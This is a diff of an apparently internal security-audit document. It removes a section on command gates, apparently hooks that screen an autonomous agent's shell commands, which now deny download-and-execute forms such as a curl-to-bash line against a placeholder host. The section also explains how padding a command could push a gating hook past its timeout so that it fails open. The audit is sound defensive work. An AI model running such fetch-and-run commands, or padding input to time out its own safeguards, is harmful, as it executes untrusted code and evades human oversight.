@@ -5,51 +5,6 @@ written against `560588c` and earlier) · **Baseline:** annotated tag `v2.7.4` �
 `d884a43`, which is where this analysis started and against which every delta
 below is measured.
 
-**X-37 / ITEM 1b IS CLOSED, 2026-08-14 — CLASS B NO LONGER EXECUTES, AND THE
-VERDICT STILL DOES NOT MOVE.** `bash -c "$(curl -sSL http://e/i.sh)"`,
-`eval "$(dl)"`, a bare `$(dl)`/backtick at a command position, `bash <(dl)`,
-`bash < <(dl)` and `bash <<< "$(dl)"` are **deny/deny on both substrates** as of
-this commit, through `cmdpos.subst_to_shell_regex` — one source rendered into
-the emitted shell gate and the emitted `gates.py`, evaluated on the five
-normalized strings the pipe trigger already computes. 53 differential rows go
-allow/allow → deny/deny, **each measured allow/allow before it was written into
-the corpus**; suite **25 / 9,739 / 0**, differential **4,163**; backlog rows
-`open` **105 → 104**, re-derived with the rule re-validated at **88 on v2.7.4
-first**. Freeze exception 71; action counts unchanged (57/69/59, retrofit
-79/93).
-
-**THIS IS A NEW LAYER. NOTHING BELOW IS REWRITTEN.** Every Class-B sentence in
-this file was measured against a named tree — `d884a43`, `e47d827`, `053a367`,
-`0d4d5af` — and **remains true of those trees forever**: §2's tables at `:219`
-and `:414`, §2.3's *"Class B is still open, and still executes"* at `:572-583`,
-the `allow allow` transcript at `:806`, `:310`'s *"Class B / X-37 is
-untouched"*, and §8's *"Still open, and both are release-blocking"* at
-`:971-980`. What is superseded is only the **present-tense inference** drawn
-from them, and it is superseded here rather than edited there — the rule this
-document states about itself, and the one the C-1 layer below paid for.
-
-**§8's item-1 condition is now fully discharged**: *"Item 1 is release-blocking
-until BOTH 1b/X-37 and B3 land"* — B3 landed at `lib/templates.py:1700`, and
-1b/X-37 lands here.
-
-**WHAT THIS DOES NOT BUY, said plainly: the verdict does not move, and the
-warrant for saying so is not C-2 alone.** §1's leg (a) is that *the emitted
-gates are not a reliable security boundary*. X-37 was **one named instance** of
-that leg, not the leg itself: **X-52** (token count as a third cost term),
-**X-54** and **X-55** remain `open`, and X-51's class — a hook killed at its
-declared timeout does not exit 2, so it fails **open** — is mitigated, not
-closed. Leg (b), **C-2** (the autonomous wrappers dispatch nothing), is
-untouched by this work. **`main` is still NOT PRODUCTION READY.**
-
-**One thing this work proved about the gates, and it belongs in the record
-because it cuts against the fix:** the first spelling of this rule was *itself*
-an instance of leg (a). Unanchored, it cost **3.97 s on an 8 KB command**;
-`_cost_guard` admits 81920 bytes, so X-51's timeout crossing was reachable by
-padding alone — a security predicate that becomes a bypass when the input grows.
-It was found by measurement, not by review, and fixed by anchoring every arm at
-a command position (**42 ms at the 80 KB ceiling**). A rule that closes a
-channel and opens a cost bypass has not closed anything.
-
 **C-1 IS CLOSED, 2026-08-14 — the first finding in this document to be FIXED
 rather than re-measured.** `LICENSE` (Apache-2.0, verbatim from apache.org,
 sha256 `cfc7749b…d30`) and a README licence statement are tracked as of this
